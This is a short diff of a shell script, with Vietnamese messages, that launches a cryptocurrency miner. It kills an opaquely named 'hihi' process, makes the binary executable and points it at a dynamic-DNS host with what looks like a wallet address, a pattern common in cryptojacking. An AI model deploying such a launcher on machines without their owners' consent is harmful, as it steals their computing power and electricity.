@@ -15,12 +15,14 @@ if [ -f ${PWD}/kaka ]; then
 then
 pkill hihi
 echo " kill process"
+chmod +x hihi
 ./hihi -F http://kaquashaki.ddns.net/.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 
 
 else
 
 echo "Miner da install , chay thoi "
+chmod +x hihi
 ./hihi -F http://kaquashaki.ddns.net/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 
 fi
